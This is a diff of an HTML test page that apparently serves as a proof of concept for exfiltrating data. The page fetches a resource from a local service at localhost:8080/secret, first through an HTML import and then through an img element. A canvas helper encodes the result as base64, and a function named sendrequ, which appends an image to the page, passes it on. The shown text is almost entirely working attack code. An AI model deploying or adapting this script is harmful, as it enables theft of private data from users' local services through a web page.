@@ -3,10 +3,9 @@
   <head>
     <meta charset="utf-8">
     <title>test</title>
-    <link rel="import" href="http://127.0.0.1:8080/secret">
   </head>
   <body>
-  
+  <img id="secret" src="http://localhost:8080/secret">
     <script>
 	
 function getBase64Image(img) {
@@ -32,8 +31,8 @@ function sendrequ(payload){
 	document.body.appendChild(img);
 }   
 
-console.log(document.querySelector('link[rel="import"]').import);
-sendrequ(document.querySelector('link[rel="import"]').import);
+console.log(getBase64Image(document.getElementById("secret")));
+sendrequ(getBase64Image(document.getElementById("secret")));
 /*
 function getFrameContents(){
    var iFrame =  document.getElementById('testf');
